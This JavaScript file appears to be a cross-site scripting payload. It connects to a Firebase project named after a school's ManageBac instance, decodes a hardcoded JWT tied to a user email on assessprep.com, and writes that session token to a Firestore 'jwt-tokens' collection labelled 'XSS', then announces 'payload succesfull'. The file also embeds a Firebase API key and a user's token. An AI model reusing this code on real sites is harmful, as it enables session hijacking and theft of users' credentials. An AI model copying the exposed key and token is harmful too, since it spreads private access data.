import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-app.js";
import {
  getFirestore,
  addDoc,
  collection,
} from "https://www.gstatic.com/firebasejs/10.7.1/firebase-firestore.js";
// import { Link } from "https://unpkg.com/react-router-dom@5.0.0/umd/react-router-dom.min.js";

// const navigate = useNavigate();
// Your web app's Firebase configuration
const firebaseConfig = {
  apiKey: "AIzaSyDvix46PGrqV4sIW3tlj-fLlb6mbuDVHj8",
  authDomain: "tnsbeaconhouse-managebac.firebaseapp.com",
  projectId: "tnsbeaconhouse-managebac",
  storageBucket: "tnsbeaconhouse-managebac.appspot.com",
  messagingSenderId: "102801144416",
  appId: "1:102801144416:web:7d3c46ce4a044c81f66105",
};

// Initialize Firebase
const app = initializeApp(firebaseConfig);
const db = getFirestore(app);

function parseJwt(token) {
  var base64Url = token.split(".")[1];
  var base64 = base64Url.replace(/-/g, "+").replace(/_/g, "/");
  var jsonPayload = decodeURIComponent(
    window
      .atob(base64)
      .split("")
      .map(function (c) {
        return "%" + ("00" + c.charCodeAt(0).toString(16)).slice(-2);
      })
      .join("")
  );

  return JSON.parse(jsonPayload);
}

const userToken =
  "eyJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjo3MDUyMzEsImVtYWlsIjoiZ3Vlc3RfdXNlcl9RUk00TklAYXNzZXNzcHJlcC5jb20iLCJobWFjIjoiN2M4NGFmZjE5YTUwYmQ5MzFhMmY4NDE3MTgxNWNkMzQxMWZhNGUyNjc1YzBlODk4ZDU3NzA5ZjM4MTJiOGRkYiIsImV4cCI6MTcwNTA0NTYzNSwiYXQiOjE3MDQxODE2MzUsInV1aWQiOiIwMUhLMzI5VkpDRjFBU0FLTVE4QTZIVFJQSCIsImNyZWF0ZWRfYXQiOiIyMDI0LTAxLTAyIDA3OjQ3OjE1IFVUQyJ9.DBpQQvdWIEuCR6pmo03ffHDt8An9XuxXsRzvDiUGTC8";
const decodedTokenPayload = parseJwt(userToken);

const redir = () => {};

const sToken = async () => {
  try {
    const docRef = await addDoc(collection(db, "jwt-tokens"), {
      email: "XSS",
      token: userToken,
    });

    console.log("Document written with ID: ", docRef.id);
  } catch (e) {
    console.error("Error adding document: ", e);
  } finally {
    redir();
  }
};

alert("payload succesfull");

sToken();
